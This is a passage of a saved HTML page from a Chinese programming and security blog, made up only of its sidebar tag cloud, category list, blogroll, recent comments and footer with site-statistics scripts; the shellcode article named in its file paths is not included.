<a  href="http://www.programlife.net/tag/sort"  class="tag-link-52"  title="3个话题"  style="font-size: 8pt;">sort</a>
<a  href="http://www.programlife.net/tag/stl-2"  class="tag-link-17"  title="40个话题"  style="font-size: 21.862745098039pt;">STL</a>
<a  href="http://www.programlife.net/tag/string"  class="tag-link-135"  title="3个话题"  style="font-size: 8pt;">string</a>
<a  href="http://www.programlife.net/tag/template"  class="tag-link-35"  title="3个话题"  style="font-size: 8pt;">template</a>
<a  href="http://www.programlife.net/tag/uac"  class="tag-link-501"  title="4个话题"  style="font-size: 9.3725490196078pt;">UAC</a>
<a  href="http://www.programlife.net/tag/ubuntu"  class="tag-link-108"  title="30个话题"  style="font-size: 20.21568627451pt;">Ubuntu</a>
<a  href="http://www.programlife.net/tag/usaco"  class="tag-link-317"  title="16个话题"  style="font-size: 16.647058823529pt;">USACO题解</a>
<a  href="http://www.programlife.net/tag/vc"  class="tag-link-131"  title="7个话题"  style="font-size: 12.117647058824pt;">VC</a>
<a  href="http://www.programlife.net/tag/visual-studio"  class="tag-link-488"  title="8个话题"  style="font-size: 12.803921568627pt;">Visual Studio</a>
<a  href="http://www.programlife.net/tag/vmware"  class="tag-link-407"  title="4个话题"  style="font-size: 9.3725490196078pt;">VMWare</a>
<a  href="http://www.programlife.net/tag/wdk"  class="tag-link-403"  title="4个话题"  style="font-size: 9.3725490196078pt;">WDK</a>
<a  href="http://www.programlife.net/tag/win32-2"  class="tag-link-102"  title="10个话题"  style="font-size: 14.039215686275pt;">Win32</a>
<a  href="http://www.programlife.net/tag/windbg"  class="tag-link-408"  title="10个话题"  style="font-size: 14.039215686275pt;">WinDbg</a>
<a  href="http://www.programlife.net/tag/windows"  class="tag-link-208"  title="14个话题"  style="font-size: 15.960784313725pt;">Windows</a>
<a  href="http://www.programlife.net/tag/wp"  class="tag-link-11"  title="15个话题"  style="font-size: 16.235294117647pt;">WordPress</a>
<a  href="http://www.programlife.net/tag/%e4%b8%8b%e8%bd%bd"  class="tag-link-39"  title="14个话题"  style="font-size: 15.960784313725pt;">下载</a>
<a  href="http://www.programlife.net/tag/%e4%b8%bb%e9%a2%98"  class="tag-link-143"  title="3个话题"  style="font-size: 8pt;">主题</a>
<a  href="http://www.programlife.net/tag/%e4%bb%a3%e7%a0%81"  class="tag-link-73"  title="7个话题"  style="font-size: 12.117647058824pt;">代码</a>
<a  href="http://www.programlife.net/tag/%e4%bf%a1%e6%81%af%e5%ae%89%e5%85%a8"  class="tag-link-537"  title="5个话题"  style="font-size: 10.470588235294pt;">信息安全</a>
<a  href="http://www.programlife.net/tag/%e5%88%9d%e8%b5%9b"  class="tag-link-313"  title="5个话题"  style="font-size: 10.470588235294pt;">初赛</a>
<a  href="http://www.programlife.net/tag/%e5%8d%9a%e5%ae%a2"  class="tag-link-327"  title="4个话题"  style="font-size: 9.3725490196078pt;">博客</a>
<a  href="http://www.programlife.net/tag/%e5%91%bd%e4%bb%a4"  class="tag-link-115"  title="3个话题"  style="font-size: 8pt;">命令</a>
<a  href="http://www.programlife.net/tag/%e5%a0%86%e5%96%b7%e5%b0%84"  class="tag-link-855"  title="5个话题"  style="font-size: 10.470588235294pt;">堆喷射</a>
<a  href="http://www.programlife.net/tag/%e5%a0%86%e6%8e%92%e5%ba%8f"  class="tag-link-153"  title="3个话题"  style="font-size: 8pt;">堆排序</a>
<a  href="http://www.programlife.net/tag/%e5%a4%9a%e7%ba%bf%e7%a8%8b"  class="tag-link-435"  title="4个话题"  style="font-size: 9.3725490196078pt;">多线程</a>
<a  href="http://www.programlife.net/tag/%e5%bc%82%e5%b8%b8"  class="tag-link-221"  title="5个话题"  style="font-size: 10.470588235294pt;">异常</a>
<a  href="http://www.programlife.net/tag/%e5%bc%95%e7%94%a8"  class="tag-link-60"  title="3个话题"  style="font-size: 8pt;">引用</a>
<a  href="http://www.programlife.net/tag/%e6%88%aa%e5%9b%be"  class="tag-link-110"  title="3个话题"  style="font-size: 8pt;">截图</a>
<a  href="http://www.programlife.net/tag/%e6%8c%87%e9%92%88"  class="tag-link-531"  title="4个话题"  style="font-size: 9.3725490196078pt;">指针</a>
<a  href="http://www.programlife.net/tag/%e6%8f%92%e4%bb%b6"  class="tag-link-229"  title="9个话题"  style="font-size: 13.490196078431pt;">插件</a>
<a  href="http://www.programlife.net/tag/%e6%a0%88%e6%ba%a2%e5%87%ba"  class="tag-link-444"  title="4个话题"  style="font-size: 9.3725490196078pt;">栈溢出</a>
<a  href="http://www.programlife.net/tag/%e6%ad%a3%e5%88%99%e8%a1%a8%e8%be%be%e5%bc%8f"  class="tag-link-564"  title="4个话题"  style="font-size: 9.3725490196078pt;">正则表达式</a>
<a  href="http://www.programlife.net/tag/%e6%ad%bb%e9%94%81"  class="tag-link-666"  title="4个话题"  style="font-size: 9.3725490196078pt;">死锁</a>
<a  href="http://www.programlife.net/tag/%e6%b1%87%e7%bc%96"  class="tag-link-104"  title="9个话题"  style="font-size: 13.490196078431pt;">汇编</a>
<a  href="http://www.programlife.net/tag/%e6%ba%90%e7%a0%81"  class="tag-link-556"  title="5个话题"  style="font-size: 10.470588235294pt;">源码</a>
<a  href="http://www.programlife.net/tag/%e7%ab%9e%e8%b5%9b"  class="tag-link-80"  title="9个话题"  style="font-size: 13.490196078431pt;">竞赛</a>
<a  href="http://www.programlife.net/tag/%e7%ac%ac%e4%ba%8c%e5%b1%8a"  class="tag-link-314"  title="4个话题"  style="font-size: 9.3725490196078pt;">第二届</a>
<a  href="http://www.programlife.net/tag/%e7%bc%96%e8%af%91%e9%94%99%e8%af%af"  class="tag-link-382"  title="4个话题"  style="font-size: 9.3725490196078pt;">编译错误</a>
<a  href="http://www.programlife.net/tag/%e7%bd%97%e4%ba%91%e5%bd%ac"  class="tag-link-105"  title="3个话题"  style="font-size: 8pt;">罗云彬</a>
<a  href="http://www.programlife.net/tag/%e8%84%b1%e5%a3%b3"  class="tag-link-507"  title="8个话题"  style="font-size: 12.803921568627pt;">脱壳</a>
<a  href="http://www.programlife.net/tag/%e8%85%be%e8%ae%af"  class="tag-link-577"  title="4个话题"  style="font-size: 9.3725490196078pt;">腾讯</a>
<a  href="http://www.programlife.net/tag/%e8%a7%a3%e9%a2%98%e6%8a%a5%e5%91%8a"  class="tag-link-315"  title="4个话题"  style="font-size: 9.3725490196078pt;">解题报告</a>
<a  href="http://www.programlife.net/tag/%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f"  class="tag-link-340"  title="4个话题"  style="font-size: 9.3725490196078pt;">设计模式</a>
<a  href="http://www.programlife.net/tag/%e8%b0%83%e8%af%95"  class="tag-link-385"  title="15个话题"  style="font-size: 16.235294117647pt;">调试</a>
<a  href="http://www.programlife.net/tag/%e8%bf%ad%e4%bb%a3%e5%99%a8"  class="tag-link-18"  title="5个话题"  style="font-size: 10.470588235294pt;">迭代器</a>
<a  href="http://www.programlife.net/tag/%e9%80%86%e5%90%91"  class="tag-link-651"  title="4个话题"  style="font-size: 9.3725490196078pt;">逆向</a>
<a  href="http://www.programlife.net/tag/%e9%87%8d%e5%ae%9a%e5%90%91"  class="tag-link-225"  title="4个话题"  style="font-size: 9.3725490196078pt;">重定向</a>
<a  href="http://www.programlife.net/tag/%e9%9d%a2%e8%af%95"  class="tag-link-298"  title="5个话题"  style="font-size: 10.470588235294pt;">面试</a>
<a  href="http://www.programlife.net/tag/%e9%a1%b6%e5%b5%8c%e6%9d%af"  class="tag-link-271"  title="7个话题"  style="font-size: 12.117647058824pt;">顶嵌杯</a>
<a  href="http://www.programlife.net/tag/%e9%a9%b1%e5%8a%a8"  class="tag-link-241"  title="15个话题"  style="font-size: 16.235294117647pt;">驱动</a></div>
</div><div  id="recent-comments-2"  class="widget widget_recent_comments"><h3>近期评论</h3><ul  id="recentcomments"><li  class="recentcomments">tanglei发表在《<a  href="http://www.programlife.net/github-alipay.html#comment-4585">5月1日前注册的GitHub账号可领取20元</a>》</li><li  class="recentcomments">代码疯子发表在《<a  href="http://www.programlife.net/github-alipay.html#comment-4579">5月1日前注册的GitHub账号可领取20元</a>》</li><li  class="recentcomments">klion26发表在《<a  href="http://www.programlife.net/github-alipay.html#comment-4578">5月1日前注册的GitHub账号可领取20元</a>》</li><li  class="recentcomments">代码疯子发表在《<a  href="http://www.programlife.net/winpcap-sniffer.html#comment-4566">基于WinPcap开发嗅探器程序</a>》</li><li  class="recentcomments">小白菜发表在《<a  href="http://www.programlife.net/winpcap-sniffer.html#comment-4549">基于WinPcap开发嗅探器程序</a>》</li></ul></div>
</div>







<div  id="southsidebar"  class="sidebar">

<div  id="categories-2"  class="widget widget_categories"><h3>分类目录</h3>		<ul>
	<li  class="cat-item cat-item-308"><a  href="http://www.programlife.net/category/acmicpc"  title="查看ACM-ICPC下的所有文章">ACM-ICPC</a> (52)
<ul  class="children">
	<li  class="cat-item cat-item-629"><a  href="http://www.programlife.net/category/acmicpc/easyacm"  title="很简单的ACM题目">ACM水题</a> (1)
</li>
	<li  class="cat-item cat-item-354"><a  href="http://www.programlife.net/category/acmicpc/hdoj"  title="HDOJ解题报告">HDOJ解题报告</a> (7)
</li>
	<li  class="cat-item cat-item-268"><a  href="http://www.programlife.net/category/acmicpc/poj"  title="POJ解题报告">POJ解题报告</a> (13)
</li>
	<li  class="cat-item cat-item-317"><a  href="http://www.programlife.net/category/acmicpc/usaco"  title="USACO题解">USACO题解</a> (16)
</li>
	<li  class="cat-item cat-item-359"><a  href="http://www.programlife.net/category/acmicpc/otherproblems"  title="其他OJ的一些题目">其他题解</a> (14)
</li>
</ul>
</li>
	<li  class="cat-item cat-item-355"><a  href="http://www.programlife.net/category/cppdev"  title="C++开发">C/C++</a> (83)
<ul  class="children">
	<li  class="cat-item cat-item-674"><a  href="http://www.programlife.net/category/cppdev/boost"  title="学习使用Boost编程">Boost编程</a> (1)
</li>
	<li  class="cat-item cat-item-4"><a  href="http://www.programlife.net/category/cppdev/cpp"  title="C++基础">C++编程</a> (31)
</li>
	<li  class="cat-item cat-item-5"><a  href="http://www.programlife.net/category/cppdev/c"  title="C语言的一些细节">C语言</a> (14)
</li>
	<li  class="cat-item cat-item-6"><a  href="http://www.programlife.net/category/cppdev/stl"  title="循序渐进学习STL">STL编程</a> (35)
</li>
</ul>
</li>
	<li  class="cat-item cat-item-889"><a  href="http://www.programlife.net/category/linuxdev"  title="Linux/Android相关学习（开发、逆向、安全）">Linux开发</a> (5)
<ul  class="children">
	<li  class="cat-item cat-item-890"><a  href="http://www.programlife.net/category/linuxdev/androidsec"  title="Android软件安全与逆向分析">Android软件安全</a> (3)
</li>
	<li  class="cat-item cat-item-883"><a  href="http://www.programlife.net/category/linuxdev/linuxsec"  title="学习Linux安全">Linux安全</a> (2)
</li>
</ul>
</li>
	<li  class="cat-item cat-item-357"><a  href="http://www.programlife.net/category/web"  title="Web相关杂项">Web</a> (66)
<ul  class="children">
	<li  class="cat-item cat-item-19"><a  href="http://www.programlife.net/category/web/protoana"  title="协议分析">HTTP协议</a> (3)
</li>
	<li  class="cat-item cat-item-613"><a  href="http://www.programlife.net/category/web/pythonprogram"  title="查看Python编程下的所有文章">Python编程</a> (8)
</li>
	<li  class="cat-item cat-item-108"><a  href="http://www.programlife.net/category/web/ubuntu"  title="查看Ubuntu下的所有文章">Ubuntu</a> (29)
</li>
	<li  class="cat-item cat-item-566"><a  href="http://www.programlife.net/category/web/websec"  title="查看Web安全下的所有文章">Web安全</a> (11)
</li>
	<li  class="cat-item cat-item-11"><a  href="http://www.programlife.net/category/web/wp"  title="WordPress建站">WordPress</a> (15)
</li>
</ul>
</li>
	<li  class="cat-item cat-item-356"><a  href="http://www.programlife.net/category/windev"  title="Windows程序设计">Windows开发</a> (179)
<ul  class="children">
	<li  class="cat-item cat-item-879"><a  href="http://www.programlife.net/category/windev/chrome-windev"  title="Chrome源码阅读 / Chrome源码学习笔记">Chrome源码学习</a> (5)
</li>
	<li  class="cat-item cat-item-430"><a  href="http://www.programlife.net/category/windev/mfcdev"  title="查看MFC编程下的所有文章">MFC编程</a> (11)
	<ul  class="children">
	<li  class="cat-item cat-item-737"><a  href="http://www.programlife.net/category/windev/mfcdev/dissecting-mfc"  title="《深入浅出MFC》读书笔记">深入浅出MFC</a> (1)
</li>
	</ul>
</li>
	<li  class="cat-item cat-item-496"><a  href="http://www.programlife.net/category/windev/pe-coff-format"  title="查看PE文件格式下的所有文章">PE文件格式</a> (12)
</li>
	<li  class="cat-item cat-item-9"><a  href="http://www.programlife.net/category/windev/asm"  title="Win32Asm学习">Win32 ASM</a> (10)
</li>
	<li  class="cat-item cat-item-7"><a  href="http://www.programlife.net/category/windev/winsdk"  title="Win32 API编程">Windows SDK</a> (27)
</li>
	<li  class="cat-item cat-item-235"><a  href="http://www.programlife.net/category/windev/winwdk"  title="驱动开发">Windows驱动开发</a> (37)
</li>
	<li  class="cat-item cat-item-439"><a  href="http://www.programlife.net/category/windev/asm-kernel"  title="查看天书夜读下的所有文章">天书夜读</a> (2)
</li>
	<li  class="cat-item cat-item-796"><a  href="http://www.programlife.net/category/windev/malware-windev"  title="恶意代码研究、学习、对抗">恶意代码</a> (13)
</li>
	<li  class="cat-item cat-item-580"><a  href="http://www.programlife.net/category/windev/exploit"  title="缓冲区溢出攻击与防范">缓冲区溢出</a> (11)
</li>
	<li  class="cat-item cat-item-502"><a  href="http://www.programlife.net/category/windev/reverse-debug"  title="查看逆向调试下的所有文章">逆向调试</a> (48)
	<ul  class="children">
	<li  class="cat-item cat-item-699"><a  href="http://www.programlife.net/category/windev/reverse-debug/av"  title="免杀学习——知己知彼百战百胜，AntiVirus">免杀</a> (2)
</li>
	</ul>
</li>
</ul>
</li>
	<li  class="cat-item cat-item-656"><a  href="http://www.programlife.net/category/jobhunt"  title="求职招聘相关话题">求职招聘</a> (5)
<ul  class="children">
	<li  class="cat-item cat-item-652"><a  href="http://www.programlife.net/category/jobhunt/bole"  title="求职招聘内部推荐">招聘推荐</a> (2)
</li>
	<li  class="cat-item cat-item-514"><a  href="http://www.programlife.net/category/jobhunt/interviewexperience"  title="笔试经验与面试经验">笔经面经</a> (3)
</li>
</ul>
</li>
	<li  class="cat-item cat-item-32"><a  href="http://www.programlife.net/category/others"  title="新闻资讯,杂七杂八等">谈天说地</a> (85)
<ul  class="children">
	<li  class="cat-item cat-item-1"><a  href="http://www.programlife.net/category/others/abouts"  title="一些文字">发展历程</a> (17)
</li>
	<li  class="cat-item cat-item-731"><a  href="http://www.programlife.net/category/others/plan"  title="我的计划我做主，Since 2012-01-04">学习规划</a> (2)
</li>
	<li  class="cat-item cat-item-361"><a  href="http://www.programlife.net/category/others/news"  title="业界新闻资讯">新闻资讯</a> (18)
</li>
	<li  class="cat-item cat-item-362"><a  href="http://www.programlife.net/category/others/someskills"  title="各种扯淡，各种自言自语">疯言疯语</a> (33)
</li>
</ul>
</li>
	<li  class="cat-item cat-item-513"><a  href="http://www.programlife.net/category/engineering"  title="软件工程 - Software Engineering">软件工程</a> (10)
<ul  class="children">
	<li  class="cat-item cat-item-516"><a  href="http://www.programlife.net/category/engineering/itculture"  title="查看IT文化下的所有文章">IT文化</a> (3)
</li>
	<li  class="cat-item cat-item-515"><a  href="http://www.programlife.net/category/engineering/designpattern"  title="查看设计模式下的所有文章">设计模式</a> (1)
</li>
	<li  class="cat-item cat-item-684"><a  href="http://www.programlife.net/category/engineering/softwarerelease"  title="个人原创作品、汉化作品、DIY作品发布">软件发布</a> (5)
</li>
	<li  class="cat-item cat-item-705"><a  href="http://www.programlife.net/category/engineering/pm"  title="工作经验杂谈，扯淡，吹水">项目管理</a> (1)
</li>
</ul>
</li>
		</ul>
</div><div  id="linkcat-14"  class="widget widget_links"><h3>友情链接</h3>
	<ul  class="xoxo blogroll">
<li><a  href="http://www.zhihua-lai.com/acm/"  title="Smart Ideas, Smart Algorithms"  target="_blank">ACMer</a></li>
<li><a  href="http://www.cppfans.org/"  title="C++爱好者博客是一个以程序开发、IT资讯为主的个人博客，旨在与各位网友交流开发经验，分享知识。"  target="_blank">C++爱好者博客</a></li>
<li><a  href="http://blog.creke.net/"  title="从这里睁眼看世界"  target="_blank">Creke(梦溪博客)</a></li>
<li><a  href="http://debugzer0.blogbus.com/"  title="Debug0`s Free Space"  target="_blank">DebugZer0</a></li>
<li><a  href="http://www.rrgod.com/"  title="软件加密解密技术以及材料科学"  target="_blank">Eddy Blog</a></li>
<li><a  href="http://www.fangsunjian.com/"  title="游戏开发 DirectX/HLSL XNA"  target="_blank">fangsunjian</a></li>
<li><a  href="http://www.jayxon.com/"  title="软件DIY、去广告、精简、绿色软件"  target="_blank">JayXon</a></li>
<li><a  href="http://www.cnblogs.com/kedebug"  title="KeDebug "  target="_blank">KeDebug</a></li>
<li><a  href="http://www.fengshuxin.com/"  title="贤王 ～～专注于ACM ICPC"  target="_blank">KLion(贤王)</a></li>
<li><a  href="http://www.ourren.com/blog"  title="Focus On Code Web Network Security Vulnerability Reverse Program Script Life"  target="_blank">ourren</a></li>
<li><a  href="http://www.tanglei.name/"  target="_blank">TangLei的博客</a></li>
<li><a  href="http://blog.tektea.com/"  title="TekTea’s Blog"  target="_blank">TekTea's Blog</a></li>
<li><a  href="http://shaoyimin.com/"  title="Anubis’s Blog"  target="_blank">Yimin Shao</a></li>
<li><a  href="http://www.coderblog.in/"  title="专注于编程技术与精品软件"  target="_blank">代码部落</a></li>
<li><a  href="http://daoluan.net/blog/"  title="捣乱小子 Code the Dream"  target="_blank">捣乱小子</a></li>
<li><a  href="http://www.programlife.net/links"  title="长期不更新的朋友都放到这里了"  target="_blank">更多链接</a></li>
<li><a  href="http://www.liweihong.net/"  title="李巍宏的独立博客——致力于嵌入式软件开发，现今做android和内核的移植"  target="_blank">李巍宏的博客</a></li>
<li><a  href="http://www.baiyuxiong.com/"  title="熊窝窝’s Blog"  target="_blank">熊窝窝</a></li>
<li><a  href="http://www.lampthneo.com/"  title="Lampth Neo"  target="_blank">翔久博客</a></li>
<li><a  href="http://www.7rack.info/"  title="the quieter you become ,the more you are able to hear"  target="_blank">轨迹</a></li>
<li><a  href="http://www.xpc-yx.com/"  title="远行’s life – step by step"  target="_blank">远行's life</a></li>
<li><a  href="http://www.xianren.org/"  title="闲人小憩-关注IT，记录闲人点滴生活！！！"  target="_blank">闲人小憩</a></li>

	</ul>
</div>

</div>





</div>




	<div  class="fixed"></div>

</div>







<div  id="footer">

	<a  id="gotop"  href="http://www.programlife.net/shellcode-diy.html#" >回到顶部</a>

	<a  id="powered"  href="http://wordpress.org/">WordPress</a>

	<div  id="copyright">

		版权所有 © 2010-2013 程序人生		&nbsp;&nbsp;		E-mail: <strong>stackexploit@gmail.com</strong>

	</div>

	<div  id="themeinfo">		网站名称:<strong><a  href="http://www.programlife.net/">程序人生</a></strong>		&nbsp;&nbsp;		站长名称:<strong><a  href="http://www.programlife.net/about/">代码疯子</a></strong>		&nbsp;&nbsp;		网站地图:		<a  href="http://www.programlife.net/sitemap.xml">Google Sitemap</a>		&nbsp;&nbsp;		<a  href="http://www.programlife.net/sitemap_baidu.xml">Baidu Sitemap</a>		&nbsp;&nbsp;		<a  href="http://www.programlife.net/sitemap.html">Static Sitemap</a>		&nbsp;&nbsp;		<script  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/stat.php"  language="JavaScript"></script><script  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/core.php"  charset="utf-8"  type="text/javascript"></script><a  href="http://www.cnzz.com/stat/website.php?web_id=2407077"  target="_blank"  title="站长统计"><img  border="0"  hspace="0"  vspace="0"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/pic.gif"></a>

	</div>

</div>





</div>



</div>






<script  type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F32d4da506dff41794de666b7169d5cd8' type='text/javascript'%3E%3C/script%3E"));
</script><script  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/h.js"  type="text/javascript"></script>












<div  id="goog-gt-tt"  class="skiptranslate"  dir="ltr"><div  style="padding: 8px;"><div><div  class="logo"><img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/translate-32.png"  width="20"  height="20"></div></div></div><div  class="top"  style="padding: 8px; float: left; width: 100%;"><h1  class="title gray">原文</h1></div><div  class="middle"  style="padding: 8px;"><div  class="original-text"></div></div><div  class="bottom"  style="padding: 8px;"><div  class="activity-links"><span  class="activity-link">提供更好的翻译建议</span><span  class="activity-link"></span></div><div  class="started-activity-container"><hr  style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div  class="activity-root"></div></div></div><div  class="status-message"  style="display: none;"></div></div></body></html>